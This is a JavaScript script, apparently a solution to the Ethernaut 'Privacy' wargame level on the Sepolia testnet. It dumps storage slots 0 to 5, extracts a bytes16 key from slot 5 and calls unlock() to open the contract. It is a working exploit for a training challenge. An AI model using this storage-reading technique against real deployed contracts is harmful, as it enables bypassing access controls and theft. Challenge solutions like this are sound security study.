import { createWalletClient, http, createPublicClient } from 'viem'
import { sepolia } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'
import 'dotenv/config'

const SEPOLIA_RPC = process.env.sepolia_rpc
const PRIVACY_ADDRESS = process.env.Privacy_ADDRESS || '0x6Fc673072888E62CB35827d9D053819C1b31e33c'
const PRIVATE_KEY = process.env.PRIVATE_KEY

console.log(`使用的合约地址: ${PRIVACY_ADDRESS}`)

// 创建账户
const account = privateKeyToAccount(PRIVATE_KEY)

const publicClient = createPublicClient({
  chain: sepolia,
  transport: http(SEPOLIA_RPC)
})

const walletClient = createWalletClient({
  account,
  chain: sepolia,
  transport: http(SEPOLIA_RPC)
})

// Privacy 合约 ABI
const privacyAbi = [
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
]

async function attack(key) {
    try {
        console.log('🚀 开始攻击 Privacy 合约...')
        
        // 检查攻击前状态
        const lockedBefore = await publicClient.readContract({
            address: PRIVACY_ADDRESS,
            abi: privacyAbi,
            functionName: 'locked'
        })
        console.log(`攻击前 locked 状态: ${lockedBefore}`)
        
        console.log(`使用密钥: ${key}`)
        console.log(`密钥类型: ${typeof key}`)
        console.log(`密钥长度: ${key.length} 字符`)
        
        // 确保密钥格式正确 - viem 会自动处理 bytes16 类型转换
        const { request } = await publicClient.simulateContract({
            account,
            address: PRIVACY_ADDRESS,
            abi: privacyAbi,
            functionName: 'unlock',
            args: [key] // viem 会根据 ABI 自动转换为 bytes16
        })

        const hash = await walletClient.writeContract(request)
        console.log(`交易已提交: ${hash}`)

        // 等待交易确认
        const receipt = await publicClient.waitForTransactionReceipt({ hash })
        console.log(`交易已确认，区块: ${receipt.blockNumber}`)
        
        // 检查攻击后状态
        const lockedAfter = await publicClient.readContract({
            address: PRIVACY_ADDRESS,
            abi: privacyAbi,
            functionName: 'locked'
        })
        console.log(`攻击后 locked 状态: ${lockedAfter}`)
        
        if (!lockedAfter) {
            console.log('🎉 攻击成功！合约已解锁！')
        } else {
            console.log('❌ 攻击失败，合约仍处于锁定状态')
        }
        
    } catch (error) {
        console.error('攻击失败:', error)
    }
}

async function queryPrivacyStorage() {
  try {
    console.log('🔍 查询 Privacy 合约存储信息...\n')
    
    // 正确的存储布局：
    // Slot 0: locked (bool)
    // Slot 1: ID (uint256) 
    // Slot 2: flattening + denomination + awkwardness (打包)
    // Slot 3: data[0]
    // Slot 4: data[1]
    // Slot 5: data[2] <- 正确的位置！
    
    const data2 = await publicClient.getStorageAt({
      address: PRIVACY_ADDRESS,
      slot: '0x5'  // data[2] 在 Slot 5
    })
    
    console.log(`Slot 5 (data[2]): ${data2}`)
    console.log(`data[2] 长度: ${data2.length} 字符`)
    
    // 确保 data2 是完整的 32 字节
    if (data2.length !== 66) {
      console.log(`❌ data[2] 长度异常: ${data2.length}, 应该是66`)
      return null
    }
    
    // 正确提取前16字节作为 bytes16
    // 对于 bytes16，我们需要前16字节，即前32个hex字符
    const key = data2.slice(0, 34) // 0x + 前32个字符 = 前16字节
    
    console.log(`🔑 解锁密钥 (bytes16): ${key}`)
    console.log(`密钥长度: ${key.length} 字符 (应该是34: 0x + 32字符)`)
    
    // 验证密钥长度和格式
    if (key.length !== 34) {
      console.log(`❌ 密钥长度不正确: ${key.length}, 应该是34`)
      return null
    }
    
    // 验证是否为有效的hex
    if (!/^0x[0-9a-fA-F]{32}$/.test(key)) {
      console.log('❌ 密钥格式不正确，不是有效的hex')
      return null
    }
    
    console.log('✅ 密钥格式验证通过')
    console.log('📝 注意: viem 会自动将此hex字符串转换为bytes16类型')
    
    return key
    
  } catch (error) {
    console.error('❌ 查询失败:', error)
    return null
  }
}

// 主函数
async function main() {
  console.log('\n=== Privacy 合约攻击脚本 ===\n')
  
  // 先检查所有相关存储槽
  console.log('📊 存储布局分析:')
  for (let i = 0; i < 6; i++) {
    const value = await publicClient.getStorageAt({
      address: PRIVACY_ADDRESS,
      slot: `0x${i.toString(16)}`
    })
    console.log(`Slot ${i}: ${value}`)
  }
  
  const key = await queryPrivacyStorage()
  if (key) {
    console.log(`\n准备使用密钥攻击: ${key}`)
    await attack(key)
  } else {
    console.log('❌ 无法获取密钥')
  }
}

main()